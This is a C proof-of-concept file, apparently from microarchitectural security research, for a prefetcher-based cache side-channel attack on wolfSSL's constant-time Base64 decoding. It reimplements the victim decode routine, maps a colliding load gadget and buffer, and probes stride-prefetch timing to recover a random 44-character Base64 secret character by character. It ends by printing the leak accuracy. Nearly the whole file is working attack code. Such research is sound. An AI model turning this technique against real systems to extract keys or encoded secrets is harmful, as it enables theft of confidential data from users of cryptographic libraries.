// Notes:
// https://github.com/wolfSSL/wolfssl/pull/3563
// completely side channel free implementation with BASE64_NO_TABLE
// seems to not be enabled by default (wolfSSL 5.7.0)
// seems to  generally be a niche feature

#include <stdio.h>
#include <unistd.h>
#include <time.h>

#include "common.h"

// colliding load instruction
static load_gadget_f gadget;

// colliding buffer
static uint8_t* colliding_buffer;

// threshold to distinguish cache hit from cache miss
static uint64_t threshold;

#define STRIDE (3333)

void __victim_load();

enum {
    BAD         = 0xFF,  /* invalid encoding */
    PAD         = '=',
    BASE64_MIN  = 0x2B,
    BASE16_MIN  = 0x30
};

static const char __attribute__((aligned(64))) base64Decode[] = {          /* aligned to cache line (offsets on the left are wrong) */
/* 0x28:       + , - . / */                   62, BAD, BAD, BAD,  63,
/* 0x30: 0 1 2 3 4 5 6 7 */    52,  53,  54,  55,  56,  57,  58,  59,
/* 0x38: 8 9 : ; < = > ? */    60,  61, BAD, BAD, BAD, BAD, BAD, BAD,
/* 0x40: @ A B C D E F G */   BAD,   0,   1,   2,   3,   4,   5,   6,
/* 0x48: H I J K L M N O */     7,   8,   9,  10,  11,  12,  13,  14,
/* 0x50: P Q R S T U V W */    15,  16,  17,  18,  19,  20,  21,  22,
/* 0x58: X Y Z [ \ ] ^ _ */    23,  24,  25, BAD, BAD, BAD, BAD, BAD,
/* 0x60: ` a b c d e f g */   BAD,  26,  27,  28,  29,  30,  31,  32,
/* 0x68: h i j k l m n o */    33,  34,  35,  36,  37,  38,  39,  40,
/* 0x70: p q r s t u v w */    41,  42,  43,  44,  45,  46,  47,  48,
/* 0x78: x y z           */    49,  50,  51
                            };

static char inline Base64_Char2Val(char c)
{
    /* 80 characters in table.
     * 64 chars in a cache line - first line has 64, second has 16
     */
    char v;
    char mask;

    c -= BASE64_MIN;
    mask = (char)((((char)(0x3f - c)) >> 7) - 1);
    /* Load a value from the first cache line and use when mask set. */
    char loaded;
    asm volatile(".global __victim_load\n__victim_load:\n mov (%1), %0\n" : "=r"(loaded) : "r" (&base64Decode[c & 0x3f]));
    v  = loaded &   mask;
    /* Load a value from the second cache line and use when mask not set. */
    v |= base64Decode[(c & 0x0f) | 0x40] & (~mask);

    return v;
}

// no error prints for eval!
#define fprintf(...) ;

static uint64_t guess_byte(size_t guess_offset, char secret) {
    // flush last accessed buffer location and probe location
    flush(colliding_buffer + 2 * STRIDE + guess_offset); 
    flush(colliding_buffer + 3 * STRIDE + guess_offset); 
    mfence();

    Base64_Char2Val(secret);
    mfence();
   
    // more accesses in userspace.
    // if offset is guessed correctly, this follows the stride and will prefetch.
    // otherwise, this will not prefetch.
    gadget(colliding_buffer + 1 * STRIDE + guess_offset);
    mfence();
    gadget(colliding_buffer + 2 * STRIDE + guess_offset);
    mfence();
    
    // fast access time -> was prefetched -> accesses followed stride -> guess was correct
    return probe(colliding_buffer + 3 * STRIDE + guess_offset) < threshold;
}

int main(int argc, char** argv) {
    uint64_t victim_buffer = (uint64_t)base64Decode;
    uint64_t victim_load = (uint64_t)__victim_load;
    
    int invocations = 0;
    
    // Stabilize experiments
    for (int i=0; i<100000; i++) {
        nop();
    }

    fprintf(stderr, "victim buffer: 0x%016zx\nvictim load: 0x%016zx\n", victim_buffer, victim_load);

    // map colliding buffer
    gadget = map_gadget(0xa000000 | (victim_load & 0x3FF));
    colliding_buffer = (void*)(((uint64_t)map_buffer(0xb0000000000, 0xf00000)) | (victim_buffer & 0xEFFFF));
    fprintf(stderr, "colliding buffer: 0x%016zx\ncolliding load: 0x%016zx\n", (uintptr_t)colliding_buffer, (uintptr_t)gadget);
    
    // calculate threshold to distinguish cache hit from cache miss
    threshold = 125; //calculate_threshold();
    fprintf(stderr, "threshold: %zu\n", threshold);
    
    srand(_rdtsc());
    char base64_chars[] = "+/0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz";

    // python3 -c "print('a'*(256//8), end='')" | base64 | sed 's/=//g' | wc -c
    #define n 44
    char secret[n+1] = {0};
    for (int randchars=0; randchars<n; randchars++) {
        secret[randchars] = base64_chars[rand() % (sizeof(base64_chars)-1)];
    }

    char uncertain[n+1] = {0};
    int counter_uncertain = 0;
    for (int current=0; current<n; current++) {
        char leakage = '?';
        uncertain[current] = ' ';
        for (int try=0; try<10; try++) {
            for (int guess=0; guess<64; guess++) {
                invocations ++;
                if (guess_byte(guess, secret[current])) {
                    if (guess < 16) {
                        if (base64Decode[guess] == (char)BAD) {
                            leakage = guess+64;
                        } else if (base64Decode[guess+64] == (char)BAD) {
                            // NOTE: this is never taken, as the last 16 entries in
                            // base64Decode are not BAD
                            __builtin_unreachable();
                        } else {
                            uncertain[current] = guess+64+BASE64_MIN;
                            counter_uncertain++;
                            leakage = guess;
                        }
                    } else {
                        leakage = guess;
                    }
                    leakage += BASE64_MIN;
                    goto stop;
                }
            }
        }

        stop:
        fprintf(stderr, "%c", leakage);
        if (leakage != secret[current] && uncertain[current] != secret[current]) {
            printf("%d %d\n", n, invocations);
            exit(0);
        }
    }
    fprintf(stderr, "\n%s %d/%d\n", uncertain, counter_uncertain, n);
    fprintf(stderr, "%s\n", secret);

    int correct = n-counter_uncertain;
    float acc = (float)correct*100/n;
    fprintf(stderr, "correct: %d/%d %.02f%%\n", correct, n, acc);

    printf("%d %d\n", counter_uncertain, invocations);

    /* FILE *file = fopen("results", "a"); */
    /* ffprintf(stderr, file, "%d %d\n", correct, n); */
}
